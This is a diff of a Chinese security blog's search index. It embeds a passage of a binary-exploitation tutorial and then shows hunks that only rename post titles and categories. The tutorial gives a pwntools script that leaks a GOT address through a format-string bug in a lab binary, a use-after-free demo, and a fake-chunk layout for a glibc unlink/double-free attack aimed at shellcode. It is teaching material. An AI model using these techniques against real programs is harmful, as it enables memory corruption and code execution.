alt="image-20230528135957703"></p><p>果然输出了栈中的内容</p><p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，直接获取栈中被视为第</strong> <strong>n+1</strong> <strong>个参数的值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**%n$x**</span><br></pre></td></tr></table></figure><p>为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p><p>继续调试：</p><p>输入%3$x</p><p>我们确实获得了 printf 的第 4 个参数</p><h3 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h3><p>调试输入%s</p><p><strong>tips</strong></p><ul><li><p>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</p></li><li><p>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</p></li><li><p>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</p></li></ul><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个数的值其实就是该格式化字符串的地址。</p><p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[tag]%p%p%p%p%p%p...</span><br></pre></td></tr></table></figure><p>输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。</p><p>通过传入got表地址，程序就会把got真实地址打印出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">leakmemory = ELF(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">__isoc99_scanf_got = leakmemory.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(__isoc99_scanf_got)</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">&#x27;%4$s&#x27;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>])) <span class="comment"># remove the first bytes of __isoc99_scanf@got</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="UAF和Double-Free的利用原理"><a href="#UAF和Double-Free的利用原理" class="headerlink" title="UAF和Double Free的利用原理"></a>UAF和Double Free的利用原理</h1><p>c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *p1;</span><br><span class="line">    p1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);<span class="comment">//申请内存空间</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;hello&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1 addr:%x,%s\n&quot;</span>,p1,p1);</span><br><span class="line">    <span class="built_in">free</span>(p1);<span class="comment">//释放内存空间</span></span><br><span class="line">    <span class="type">char</span> *p2;</span><br><span class="line">    p2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);<span class="comment">//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;world&quot;</span>,<span class="number">10</span>);<span class="comment">//对内存进行修改</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p2 addr:%x,%s\n&quot;</span>,p2,p1);<span class="comment">//验证</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码所示</p><p>1.指针p1申请内存，打印其地址值</p><p>2.然后释放p1</p><p>3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528140649816.png" alt="image-20230528140649816"></p><p>p1与p2地址相同，p1指针释放后，p2申请相同的大小的内存，操作系统会将之前给p1的地址分配给</p><p>p2，修改p2的值，p1也被修改了。</p><p><strong>根本原因</strong></p><p>应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放回内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，</p><p>dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p><p><strong>简单讲</strong>就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p><h2 id="linxu堆漏洞之Double-free"><a href="#linxu堆漏洞之Double-free" class="headerlink" title="linxu堆漏洞之Double free"></a>linxu堆漏洞之Double free</h2><h3 id="Double-free-同一个指针指向的内存被free2次"><a href="#Double-free-同一个指针指向的内存被free2次" class="headerlink" title="Double free:同一个指针指向的内存被free2次"></a>Double free:同一个指针指向的内存被free2次</h3><h3 id="Glibc背景知识"><a href="#Glibc背景知识" class="headerlink" title="Glibc背景知识"></a>Glibc背景知识</h3><p>Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多，就不赘述了。接下来介绍一下Linux下Double free漏洞原理以及free函数的堆块合并过程。</p><p>Double free漏洞原理： free函数在释放堆块时，会通过隐式链表判断相邻前、后堆块是否为空闲堆块；如果堆块为空闲就会进行合并，然后利用Unlink机制将该空闲堆块从Unsorted bin中取下。如果用户精心构造的假堆块被Unlink，很容易导致一次固定地址写，然后转换为任意地址读写，从而控制程序的执行。</p><p>Linux free函数原理</p><p>由堆块头部形成的隐式链表可知，一个需释放堆块相邻的堆块有两个：前一个块（由当前块头指针加pre_size确定），后一个块（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：向后合并、向前合并。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。</p><p>malloc.c int_free函数中相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line">(((mchunkptr)(((<span class="type">char</span> \*) (p)) + (s)))-&gt;size&amp; PREV_INUSE)</span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* consolidate backward \*/</span> <span class="comment">// &quot;向后合并&quot;</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//如果前一个块为空闲，则进行合并</span></span><br><span class="line">prevsize = p-&gt;prev_size; <span class="comment">//获得前一个块大小</span></span><br><span class="line">size += prevsize; <span class="comment">//合并后堆块大小</span></span><br><span class="line">p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize)); <span class="comment">//根据当前块指针和前一个块大小，确定前一个块位置，即合并后块位置</span></span><br><span class="line">unlink(av, p, bck, fwd); <span class="comment">//利用unlink从显式链表Unsorted</span></span><br><span class="line">bin取下前一个块</span><br><span class="line">&#125;</span><br><span class="line">nextchunk = chunk_at_offset(p, size); <span class="comment">//根据当前块指针和当前块大小， 确定后一个块位置，</span></span><br><span class="line">nextsize = chunksize(nextchunk); <span class="comment">//获得后一个块大小</span></span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//根据下一个块的下一个块的PREV_INUSE位，判断下一个块是否空闲</span></span><br><span class="line"><span class="comment">/* consolidate forward \*/</span> <span class="comment">// &quot;向前合并&quot;</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果后一个块为空闲，则进行合并</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd); <span class="comment">//使用unlink将后一个块从unsorted</span></span><br><span class="line">bin中取下</span><br><span class="line">size += nextsize; <span class="comment">//扩大当前块大小即可完成向前合并</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>//由于unlink的危险性，添加了一些检测机制，完整版unlink宏如下</p><p>/* Take a chunk off a bin list */</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Double-free漏洞利用原理"><a href="#Double-free漏洞利用原理" class="headerlink" title="Double free漏洞利用原理"></a>Double free漏洞利用原理</h3><p>以64位应用为例：如果在free一个指针指向的块时，由于堆溢出，将后一个块的块头改成如下格式：</p><ul><li>fake_prevsize1 = 被释放块大小；</li><li>fake_size1 = 0x20 | 1 (fake_size1 = 0x20)</li><li>fake_fd = <a href="mailto:&#x66;&#x72;&#101;&#x65;&#64;&#x67;&#111;&#x74;&#x2e;&#112;&#x6c;&#x74;">&#x66;&#x72;&#101;&#x65;&#64;&#x67;&#111;&#x74;&#x2e;&#112;&#x6c;&#x74;</a> - 0x18 </li><li>fake_bk = shellcode address</li><li>fake_prevsize2 = 0x20</li><li>fake_size2 = 0x10</li></ul><p>如果chunk0被释放(fake_size1 = 0x21)，进行空闲块合并时，1）由于前一个块非空闲，不会向后合并。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。如果chunk1被释放(fake_size1 = 0x20)，进行空闲块合并时，1）由于前一个块空闲，向后合并,导致unlink。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。根据unlink宏知道， 前一个块 FD 指向 <a href="mailto:&#x66;&#x72;&#101;&#x65;&#64;&#103;&#111;&#116;&#46;&#112;&#x6c;&#116;">&#x66;&#x72;&#101;&#x65;&#64;&#103;&#111;&#116;&#46;&#112;&#x6c;&#116;</a> - 0x18, 后一个块 BK 指向 shellcode address。然后前一个块 FD 的bk指针即<a href="mailto:&#102;&#x72;&#x65;&#x65;&#x40;&#103;&#111;&#116;&#x2e;&#x70;&#x6c;&#116;">&#102;&#x72;&#x65;&#x65;&#x40;&#103;&#111;&#116;&#x2e;&#x70;&#x6c;&#116;</a>，值为shellcode address, 后一个块 BK 的 fd 指针即shellcode+ 0x10，值为 <a href="mailto:&#102;&#114;&#101;&#x65;&#64;&#x67;&#x6f;&#x74;&#x2e;&#112;&#x6c;&#x74;">&#102;&#114;&#101;&#x65;&#64;&#x67;&#x6f;&#x74;&#x2e;&#112;&#x6c;&#x74;</a>。从而实现了一次固定地址写。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528162811484.png" alt="image-20230528145046242"></p><p>但是，由于当前glibc的加固检测机制，会检查显式链表中前一个块的fd与后一个块的bk是否都指向当前需要unlink的块。这样攻击者就无法替换chunk1(或chunk0)的fd与bk。相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(__builtin_expect(FD-&gt;bk!=P||BK-&gt;fd!=P,<span class="number">0</span>))</span><br><span class="line">malloc_printerr(check_action,<span class="string">&quot;corrupteddouble-linkedlist&quot;</span>,P,AV)</span><br></pre></td></tr></table></figure><p>针对这种情况，需要在内存中找到一个指向需要unlink块的指针，就可以绕过。</p>]]></content>
       
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -308,7 +327,7 @@
     
     
     <entry>
-      <title>逆向-二进制安全漏洞之缓冲区溢出（31）</title>
+      <title>二进制安全漏洞之缓冲区溢出（31）</title>
       <link href="/2023/05/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-31-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
       <url>/2023/05/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-31-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
       
@@ -317,7 +336,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -365,7 +384,7 @@
     
     
     <entry>
-      <title>逆向-ELF文件结构简介（30）</title>
+      <title>ELF文件结构简介（30）</title>
       <link href="/2023/05/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-30-ELF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E7%AE%80%E4%BB%8B/"/>
       <url>/2023/05/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-30-ELF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E7%AE%80%E4%BB%8B/</url>
       
@@ -374,7 +393,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -384,7 +403,7 @@
     
     
     <entry>
-      <title>逆向-PE 表（29）</title>
+      <title>PE 表（29）</title>
       <link href="/2023/05/24/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-29-PE-%E8%A1%A8/"/>
       <url>/2023/05/24/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-29-PE-%E8%A1%A8/</url>
       
@@ -393,7 +412,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -498,7 +517,7 @@
     
     
     <entry>
-      <title>逆向-PE文件结构基础（28）</title>
+      <title>PE文件结构基础（28）</title>
       <link href="/2023/05/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-28-PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%8F%8A%E8%8A%82%E8%A1%A8%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/"/>
       <url>/2023/05/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-28-PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%8F%8A%E8%8A%82%E8%A1%A8%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/</url>
       
@@ -507,7 +526,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -517,7 +536,7 @@
     
     
     <entry>
-      <title>逆向-GBD插件（27）</title>
+      <title>GBD插件（27）</title>
       <link href="/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-27-GDB%E6%8F%92%E4%BB%B6/"/>
       <url>/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-27-GDB%E6%8F%92%E4%BB%B6/</url>
       
@@ -526,7 +545,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -574,7 +593,7 @@
     
     
     <entry>
-      <title>逆向-linux动态调试之GDB（26）</title>
+      <title>linux动态调试之GDB（26）</title>
       <link href="/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-26-Linux%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A5%9E%E5%99%A8%E4%B9%8BGDB%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
       <url>/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-26-Linux%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A5%9E%E5%99%A8%E4%B9%8BGDB%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
       
@@ -583,7 +602,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -593,7 +612,7 @@
     
     
     <entry>
-      <title>逆向-Windbg（25）</title>
+      <title>Windbg（25）</title>
       <link href="/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-25-Windbg-%E5%92%8C-Windbg-preview%E4%BB%8B%E7%BB%8D/"/>
       <url>/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-25-Windbg-%E5%92%8C-Windbg-preview%E4%BB%8B%E7%BB%8D/</url>
       
@@ -602,7 +621,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -612,7 +631,7 @@
     
     
     <entry>
-      <title>逆向-x_96_dbg介绍（24）</title>
+      <title>x_96_dbg介绍（24）</title>
       <link href="/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-24-x-96-dbg%E4%BB%8B%E7%BB%8D/"/>
       <url>/2023/05/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-24-x-96-dbg%E4%BB%8B%E7%BB%8D/</url>
       
@@ -621,7 +640,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -650,7 +669,7 @@
     
     
     <entry>
-      <title>逆向-OD实战训练分析解密算法（23）</title>
+      <title>OD实战训练分析解密算法（23）</title>
       <link href="/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-23-OD%E5%AE%9E%E6%88%98%E8%AE%AD%E7%BB%83%E5%88%86%E6%9E%90%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
       <url>/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-23-OD%E5%AE%9E%E6%88%98%E8%AE%AD%E7%BB%83%E5%88%86%E6%9E%90%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</url>
       
@@ -659,7 +678,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -669,7 +688,7 @@
     
     
     <entry>
-      <title>逆向-OD反调试：过程序调式保护技术（22）</title>
+      <title>OD反调试：过程序调式保护技术（22）</title>
       <link href="/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-22-OD%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95%EF%BC%9A%E8%BF%87%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/"/>
       <url>/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-22-OD%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95%EF%BC%9A%E8%BF%87%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/</url>
       
@@ -678,7 +697,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -688,7 +707,7 @@
     
     
     <entry>
-      <title>逆向-OD介绍和基本操作（21）</title>
+      <title>OD介绍和基本操作（21）</title>
       <link href="/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-21-OD%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
       <url>/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-21-OD%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
       
@@ -697,7 +716,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -745,7 +764,7 @@
     
     
     <entry>
-      <title>逆向-IDA linux下的反编译命令-objdump（20）</title>
+      <title>IDA linux下的反编译命令-objdump（20）</title>
       <link href="/2023/05/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-20-linux%E4%B8%8B%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4-objdump/"/>
       <url>/2023/05/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-20-linux%E4%B8%8B%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4-objdump/</url>
       
@@ -754,7 +773,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -764,7 +783,7 @@
     
     
     <entry>
-      <title>逆向-IDA 二进制分析框架-radare2（19）</title>
+      <title>IDA 二进制分析框架-radare2（19）</title>
       <link href="/2023/05/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-19-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6-radare2/"/>
       <url>/2023/05/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-19-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6-radare2/</url>
       
@@ -773,7 +792,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -802,7 +821,7 @@
     
     
     <entry>
-      <title>逆向-Ghidra工具的介绍和使用（18）</title>
+      <title>Ghidra工具的介绍和使用（18）</title>
       <link href="/2023/05/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-18-%E9%80%86%E5%90%91%E7%A5%9E%E5%99%A8%EF%BC%9AGhidra%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
       <url>/2023/05/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-18-%E9%80%86%E5%90%91%E7%A5%9E%E5%99%A8%EF%BC%9AGhidra%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
       
@@ -811,7 +830,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -821,7 +840,7 @@
     
     
     <entry>
-      <title>逆向-IDA Pro之IDA python介绍和功能（17）</title>
+      <title>IDA Pro之IDA python介绍和功能（17）</title>
       <link href="/2023/05/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-17-IDA-Pro%E4%B9%8BIDA-Python%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%8A%9F%E8%83%BD/"/>
       <url>/2023/05/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-17-IDA-Pro%E4%B9%8BIDA-Python%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%8A%9F%E8%83%BD/</url>
       
@@ -830,7 +849,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -840,7 +859,7 @@
     
     
     <entry>
-      <title>逆向-IDA Pro逆向训练（16）</title>
+      <title>IDA Pro逆向训练（16）</title>
       <link href="/2023/05/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-16-IDA-Pro%E9%80%86%E5%90%91%E8%AE%AD%E7%BB%83/"/>
       <url>/2023/05/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-16-IDA-Pro%E9%80%86%E5%90%91%E8%AE%AD%E7%BB%83/</url>
       
@@ -849,7 +868,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -859,7 +878,7 @@
     
     
     <entry>
-      <title>逆向-静态分析工具——IDA Pro介绍和功能介绍（15）</title>
+      <title>静态分析工具——IDA Pro介绍和功能介绍（15）</title>
       <link href="/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-15-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-IDA-Pro%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/"/>
       <url>/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-15-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-IDA-Pro%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/</url>
       
@@ -868,7 +887,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -878,7 +897,7 @@
     
     
     <entry>
-      <title>逆向-查壳工具的使用（14）</title>
+      <title>查壳工具的使用（14）</title>
       <link href="/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-14-%E6%9F%A5%E5%A3%B3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
       <url>/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-14-%E6%9F%A5%E5%A3%B3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
       
@@ -887,7 +906,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -897,7 +916,7 @@
     
     
     <entry>
-      <title>逆向-基础工具讲解（13）</title>
+      <title>基础工具讲解（13）</title>
       <link href="/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-13-%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E8%AE%B2%E8%A7%A3/"/>
